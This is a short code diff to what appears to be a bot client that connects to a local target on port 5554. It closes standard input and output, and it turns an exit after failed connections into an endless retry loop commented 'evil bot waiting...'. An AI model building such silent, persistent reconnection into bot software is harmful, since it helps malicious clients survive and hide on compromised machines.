@@ -9,7 +9,7 @@
 
 #define ATTEMPTS_MAX 10
 
-#define IDLE_BETWEEN_CONNECT 50000
+#define IDLE_BETWEEN_CONNECT 1000000
 
 #define TARGET_IP (char*)"127.0.0.1"
 #define TARGET_PORT (char*)"5554"
@@ -20,6 +20,10 @@ main(int argc, char *argv[])
 	BOT *bot;
 	bool ret;
 	int i;
+
+	//close unusible fds
+	close(0);
+	close(1);
 
 	bot = new BOT();
 
@@ -37,8 +41,12 @@ main(int argc, char *argv[])
 			break;
 
 		i++;
-		if (i > ATTEMPTS_MAX)
-			goto err;
+		if (i > ATTEMPTS_MAX) {
+			//evil bot waiting...
+			i = 0;
+			sleep(60);
+		}
+
 		usleep(IDLE_BETWEEN_CONNECT);
 	}
 
